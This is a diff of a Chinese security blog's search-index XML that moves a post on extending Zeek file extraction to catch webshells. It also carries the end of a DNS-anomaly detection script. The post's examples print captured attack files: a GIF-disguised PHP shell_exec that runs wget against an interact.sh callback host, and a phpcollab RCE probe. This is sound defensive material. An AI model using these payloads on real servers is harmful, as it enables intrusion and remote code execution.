SuspiciousDNSTraffic::multiplier_threshold;</span><br><span class="line">        local max_sd_threshold = avg + sd * SuspiciousDNSTraffic::deviation_threshold;</span><br><span class="line">        local min_sd_threshold = avg - sd * SuspiciousDNSTraffic::deviation_threshold;</span><br><span class="line"></span><br><span class="line">        # Compare the current payload size with the calculated average and standard deviation</span><br><span class="line">        if ( avg != 0.0 ) &#123;</span><br><span class="line">            local alert_reason: set[string] = set();</span><br><span class="line">            if ( len &gt; max_avg_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$avg_threshold = max_avg_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &gt; avg_threshold&quot;];</span><br><span class="line">            &#125; else if ( len &lt; min_avg_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$avg_threshold = min_avg_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &lt; avg_threshold&quot;];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ( len &gt; max_sd_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$sd_threshold = max_sd_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &gt; sd_threshold&quot;];</span><br><span class="line">            &#125; else if ( len &lt; min_sd_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$sd_threshold = min_sd_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &lt; sd_threshold&quot;];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ( |alert_reason| &gt; 0 ) &#123;</span><br><span class="line">                c$dns$alert_reason = alert_reason;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # c$dns$payload_prev_avg = avg;</span><br><span class="line">        # c$dns$payload_prev_sd = sd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Initialize the event handler for analyzing DNS requests</span><br><span class="line">event zeek_init() &#123;</span><br><span class="line">    # Define a reducer to calculate the standard deviation of DNS payload sizes</span><br><span class="line">    local r_std_dev = SumStats::Reducer($stream=&quot;dns_payload_len&quot;, $apply=set(SumStats::STD_DEV));</span><br><span class="line"></span><br><span class="line">    # Create a SumStats object to collect data every baseline_interval (e.g. 5 minutes)</span><br><span class="line">    SumStats::create([</span><br><span class="line">        $name = &quot;dns_payload_len.std_dev&quot;,</span><br><span class="line">        $epoch = baseline_interval,</span><br><span class="line">        $reducers = set(r_std_dev),</span><br><span class="line">        $epoch_result(ts: time, key: SumStats::Key, result: SumStats::Result) = &#123; </span><br><span class="line">            local current_avg = double_to_count(result[&quot;dns_payload_len&quot;]$average);</span><br><span class="line">            local current_std_dev = double_to_count(result[&quot;dns_payload_len&quot;]$std_dev);</span><br><span class="line"></span><br><span class="line">            # Initialize the table with the given data</span><br><span class="line">            data[key$str] = [$prev_avg = current_avg, $prev_sd = current_std_dev];</span><br><span class="line"></span><br><span class="line">            # Update the data table with the new values</span><br><span class="line">            Config::set_value(&quot;SuspiciousDNSTraffic::data&quot;, data);</span><br><span class="line">        &#125;</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://pic.vjshi.com/2021-12-23/33ac8590ed1844d5bf0251349ea6da19/online/main.jpg?x-oss-process=style/video_cover_20231101" alt="未完待续视频素材下载, 未完待续AE模板下载_光厂(VJ师网)"></p>
-<h5 id="2-请求域名长度异常"><a href="#2-请求域名长度异常" class="headerlink" title="2. 请求域名长度异常"></a>2. 请求域名长度异常</h5><h5 id="3-非常见域名监控"><a href="#3-非常见域名监控" class="headerlink" title="3. 非常见域名监控"></a>3. 非常见域名监控</h5><h5 id="4-Fast-Flux"><a href="#4-Fast-Flux" class="headerlink" title="4. Fast Flux"></a>4. Fast Flux</h5><h5 id="5-非常见请求类型"><a href="#5-非常见请求类型" class="headerlink" title="5. 非常见请求类型"></a>5. 非常见请求类型</h5><h5 id="6-域名信誉度"><a href="#6-域名信誉度" class="headerlink" title="6. 域名信誉度"></a>6. 域名信誉度</h5>]]></content>
-      <categories>
-        <category>NTA</category>
-      </categories>
-      <tags>
-        <tag>Zeek</tag>
-        <tag>NTA</tag>
-        <tag>NIDS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Zeek - File Extraction Plus</title>
-    <url>/2021/12/31/Zeek-File-Extraction-Plus/</url>
-    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>最近在研究如何将Wazuh与YARA整合，也就是当触发Wazuh FIM事件时通过使用Wazuh主动响应模块自动执行YARA扫描。该功能将扫描集中在新文件或最近修改过的文件上，从而优化了被监控端点的资源消耗。由于我司的业务特性，最先想到的场景就是WebShell的检测了。</p>
-<p>下面来说说在实际环境中带来的“挑战”吧。该功能主要是依托Wazuh FIM事件，如果大家熟悉Wazuh的话都应该知道，触发FIM事件的必要条件是指定监控目录。那么，当你拿着从CMDB筛选出的Web服务器给到运维询问Web路径时，你很可能无法得到你想要的答案。对于这种路径不统一的情况，你可以选择自己人工手动收集并维护，如果面对上千台的服务器，那会花费大量的时间成本，或者你可以选择将问题上升推进整改（这条“路”不好走啊😂）。</p>
-<h4 id="办法总比困难多"><a href="#办法总比困难多" class="headerlink" title="办法总比困难多"></a>办法总比困难多</h4><p>都说上帝为你关了一扇门，必定会为你打开一扇窗。某天在写代码时看到Twitter推了一条Zeek的动态，此时，我悟了😅！纠结个毛的路径？我直接把需要的数据在NTA上还原出来不就得了，只需将EDR装在NTA上并监控文件还原的目录即可。至于我为啥选择Zeek没用Suricata，主要还是因为Zeek可定制化程度比Suricata更高一些。另外一点Zeek支持集群化部署，规则可以直接由Manager统一下发，这点要比Suricata方便很多，当然这也得益于集群的优势。</p>
-<p>说回文件还原的事儿，Zeek上已经有 “前人” (<strong><a href="https://github.com/hosom/file-extraction/actions"><em>hosom</em></a></strong>) 写过一个文件还原的模块。不过在使用中也发现了一些不太贴合我这边实际场景的情况，好在Zeek非常的“<strong>Open</strong>”😁只需要稍加改动就可以满足我的需求了。</p>
-<h4 id="做了哪些改进"><a href="#做了哪些改进" class="headerlink" title="做了哪些改进"></a>做了哪些改进</h4><ul>
-<li><p>去其糠糟，取其精华</p>
-<p>Zeek 和 Suricata 记录日志的方式比较相似，都是根据事件类型来记录日志。正因如此，若想对文件还原事件进行溯源，还需借助协议解析日志来进行上下文的关联。例如，通过HTTP协议还原的文件，就需要借助<code>http.log</code>。由于在我的实际环境中HTTP流量很大，如果不对协议解析的事件做过滤的话，那么输出的日志量会非常的“恐怖”。因此，我做了一些优化，现在只有当匹配到文件还原事件后，才会输出对应的协议解析事件。</p>
-<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/file-extension-logs.zeek">file-extension-logs.zeek</a></strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record Files::Info += &#123;</span><br><span class="line">      flags:      <span class="built_in">string</span>      &amp;<span class="keyword">default</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">Files::log_policy</span><span class="params">(rec: Files::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$flags == <span class="string">&quot;&quot;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(Files::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;file_extraction&quot;</span>, $path=<span class="string">&quot;file-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(Files::LOG, filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a></strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record HTTP::Info += &#123;</span><br><span class="line">      records:    <span class="keyword">bool</span>        &amp;<span class="keyword">default</span>=F;</span><br><span class="line">      domain:     <span class="built_in">string</span>      &amp;optional &amp;<span class="built_in">log</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$records == F )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(HTTP::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;http_extraction&quot;</span>, $path=<span class="string">&quot;http-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(HTTP::LOG, filter);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">export</span> &#123;</span><br><span class="line">      global http: function(f: fa_file): fa_file;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">http</span><span class="params">(f: fa_file)</span>: fa_file</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      f$http$records = T;</span><br><span class="line">      f$http$domain = f$http$host;</span><br><span class="line">      <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>示例 - 1</strong></p>
-<p>**<a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a>**，负责记录命中文件还原的协议解析事件，后期通过将2个事件fuid字段进行关联，可以帮助我们更好的去分析整个事件。</p>
-<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png" alt="image-20211101202304818"></p>
-</li>
-<li><p>更灵活，更强大</p>
-<p>​    支持根据文件类型选择<strong>hash</strong>或者<strong>extract</strong> </p>
-<p>​    <strong>hash</strong>: 只计算文件的HASH但不对此文件进行提取；</p>
-<p>​    <strong>extract</strong>: 还原指定类型的文件。支持针对HTTP协议，可选域名、URI、请求方法等字段组合进行提取，文件还原后按照日期存储；</p>
-<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/extract-custom.zeek">extract-custom.zeek</a></strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FileExtraction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_types: <span class="built_in">set</span>[<span class="built_in">string</span>, <span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;text/x-php&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-pdf&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_extract: <span class="built_in">set</span>[<span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;POST&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;extract&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;extract&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;hash&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;hash&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::http_extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( f$http?$host &amp;&amp; f$http?$method &amp;&amp; f$http?$uri &amp;&amp; f$info$is_orig )</span><br><span class="line">            <span class="keyword">if</span> ( [f$http$method] in custom_extract )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        f$info$flags = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    <strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/store-files-by-md5.zeek">store-files-by-md5.zeek</a></strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line">@load policy/frameworks/files/hash-all-files</span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtraction::path == <span class="string">&quot;&quot;</span> )</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">	<span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 按照日期进行文件的还原存储</span></span><br><span class="line">	<span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">	<span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">	<span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtraction::path, ndate);</span><br><span class="line">	mkdir(dest_dir);</span><br><span class="line">	<span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s-%s.%s&quot;</span>, dest_dir, f<span class="variable">$source</span>, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s %s&quot;</span>, orig, dest);</span><br><span class="line">	when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">	    &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( rename(orig, dest) )</span><br><span class="line">    	f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong>示例 - 2</strong></p>
-<ul>
-<li>Zeek - Files</li>
-</ul>
-<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-4.png" alt="image-20211101213845765"></p>
-<ul>
-<li>​    Zeek - HTTP</li>
-</ul>
-<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-7.png" alt="image-20211101220829730"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-2f48899b463009a77234056c62f5c4fb.gif</span><br><span class="line">GIF89a213213123&lt;?php shell_exec(<span class="string">&quot;wget -c http://c5vi7ua23aksl756fsdgcf9186ayyyyoy.interact.sh&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><strong>示例 - 3</strong></p>
-<ul>
-<li>Zeek - Files</li>
-</ul>
-<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-5.png" alt="image-20211101214516921"></p>
-<ul>
-<li>Zeek - HTTP</li>
-</ul>
-<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-6.png" alt="image-20211101214915506"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-c77da62fa1b8f687ea423581657dcc2c.php</span><br><span class="line">&lt;?php <span class="built_in">echo</span> md5(<span class="string">&#x27;phpcollab_rce&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>小提示：</strong></p>
-<p>当启用文件提取时，记得调整Zeek的这个配置，指定最大提取数据大小，否则会出现提取被截段的现象。</p>
-<ul>
-<li>file-extract_limit.zeek</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">redef FileExtract::default_limit = <span class="number">5000000000</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><ul>
-<li><p><strong><a href="https://github.com/Canon88/file-extraction-plus">canon/file-extraction-plus</a></strong></p>
-</li>
-<li><p><strong><a href="https://github.com/hosom/file-extraction/actions">hosom/file-extraction</a></strong></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>NTA</category>
-      </categories>
-      <tags>
-        <tag>Zeek</tag>
-        <tag>NTA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Zeek-Kafka 之 硬盘舒服了!</title>
     <url>/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/</url>
     <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>​    哎，今年上半年实在太忙了，工作中一些琐碎的事让我日常处于和技术“脱线”的状态。好不容易挤出一点时间来整理一下手头的东西，想着还有哪些可以拿出来给大家分享。</p>
@@ -2355,6 +2277,84 @@
 <h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
 <li><a href="https://github.com/zeek/zeekctl/pull/40/files/c44382aea866925d884e88df3acc51d687986593">pf_ring: add new ‘inner’ load balancing strategies </a></li>
 <li><a href="https://community.zeek.org/t/how-to-confige-the-cluster-type-using-pf-ring-doing-loadbalance/6809"><a href="https://community.zeek.org/t/how-to-confige-the-cluster-type-using-pf-ring-doing-loadbalance/6809">How to confige the “cluster type” using PF_RING doing loadbalance</a></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>NTA</category>
+      </categories>
+      <tags>
+        <tag>Zeek</tag>
+        <tag>NTA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Zeek - File Extraction Plus</title>
+    <url>/2021/12/31/Zeek-File-Extraction-Plus/</url>
+    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>最近在研究如何将Wazuh与YARA整合，也就是当触发Wazuh FIM事件时通过使用Wazuh主动响应模块自动执行YARA扫描。该功能将扫描集中在新文件或最近修改过的文件上，从而优化了被监控端点的资源消耗。由于我司的业务特性，最先想到的场景就是WebShell的检测了。</p>
+<p>下面来说说在实际环境中带来的“挑战”吧。该功能主要是依托Wazuh FIM事件，如果大家熟悉Wazuh的话都应该知道，触发FIM事件的必要条件是指定监控目录。那么，当你拿着从CMDB筛选出的Web服务器给到运维询问Web路径时，你很可能无法得到你想要的答案。对于这种路径不统一的情况，你可以选择自己人工手动收集并维护，如果面对上千台的服务器，那会花费大量的时间成本，或者你可以选择将问题上升推进整改（这条“路”不好走啊😂）。</p>
+<h4 id="办法总比困难多"><a href="#办法总比困难多" class="headerlink" title="办法总比困难多"></a>办法总比困难多</h4><p>都说上帝为你关了一扇门，必定会为你打开一扇窗。某天在写代码时看到Twitter推了一条Zeek的动态，此时，我悟了😅！纠结个毛的路径？我直接把需要的数据在NTA上还原出来不就得了，只需将EDR装在NTA上并监控文件还原的目录即可。至于我为啥选择Zeek没用Suricata，主要还是因为Zeek可定制化程度比Suricata更高一些。另外一点Zeek支持集群化部署，规则可以直接由Manager统一下发，这点要比Suricata方便很多，当然这也得益于集群的优势。</p>
+<p>说回文件还原的事儿，Zeek上已经有 “前人” (<strong><a href="https://github.com/hosom/file-extraction/actions"><em>hosom</em></a></strong>) 写过一个文件还原的模块。不过在使用中也发现了一些不太贴合我这边实际场景的情况，好在Zeek非常的“<strong>Open</strong>”😁只需要稍加改动就可以满足我的需求了。</p>
+<h4 id="做了哪些改进"><a href="#做了哪些改进" class="headerlink" title="做了哪些改进"></a>做了哪些改进</h4><ul>
+<li><p>去其糠糟，取其精华</p>
+<p>Zeek 和 Suricata 记录日志的方式比较相似，都是根据事件类型来记录日志。正因如此，若想对文件还原事件进行溯源，还需借助协议解析日志来进行上下文的关联。例如，通过HTTP协议还原的文件，就需要借助<code>http.log</code>。由于在我的实际环境中HTTP流量很大，如果不对协议解析的事件做过滤的话，那么输出的日志量会非常的“恐怖”。因此，我做了一些优化，现在只有当匹配到文件还原事件后，才会输出对应的协议解析事件。</p>
+<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/file-extension-logs.zeek">file-extension-logs.zeek</a></strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record Files::Info += &#123;</span><br><span class="line">      flags:      <span class="built_in">string</span>      &amp;<span class="keyword">default</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">Files::log_policy</span><span class="params">(rec: Files::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$flags == <span class="string">&quot;&quot;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(Files::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;file_extraction&quot;</span>, $path=<span class="string">&quot;file-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(Files::LOG, filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a></strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record HTTP::Info += &#123;</span><br><span class="line">      records:    <span class="keyword">bool</span>        &amp;<span class="keyword">default</span>=F;</span><br><span class="line">      domain:     <span class="built_in">string</span>      &amp;optional &amp;<span class="built_in">log</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$records == F )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(HTTP::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;http_extraction&quot;</span>, $path=<span class="string">&quot;http-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(HTTP::LOG, filter);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">export</span> &#123;</span><br><span class="line">      global http: function(f: fa_file): fa_file;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">http</span><span class="params">(f: fa_file)</span>: fa_file</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      f$http$records = T;</span><br><span class="line">      f$http$domain = f$http$host;</span><br><span class="line">      <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 - 1</strong></p>
+<p>**<a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a>**，负责记录命中文件还原的协议解析事件，后期通过将2个事件fuid字段进行关联，可以帮助我们更好的去分析整个事件。</p>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png" alt="image-20211101202304818"></p>
+</li>
+<li><p>更灵活，更强大</p>
+<p>​    支持根据文件类型选择<strong>hash</strong>或者<strong>extract</strong> </p>
+<p>​    <strong>hash</strong>: 只计算文件的HASH但不对此文件进行提取；</p>
+<p>​    <strong>extract</strong>: 还原指定类型的文件。支持针对HTTP协议，可选域名、URI、请求方法等字段组合进行提取，文件还原后按照日期存储；</p>
+<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/extract-custom.zeek">extract-custom.zeek</a></strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FileExtraction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_types: <span class="built_in">set</span>[<span class="built_in">string</span>, <span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;text/x-php&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-pdf&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_extract: <span class="built_in">set</span>[<span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;POST&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;extract&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;extract&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;hash&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span 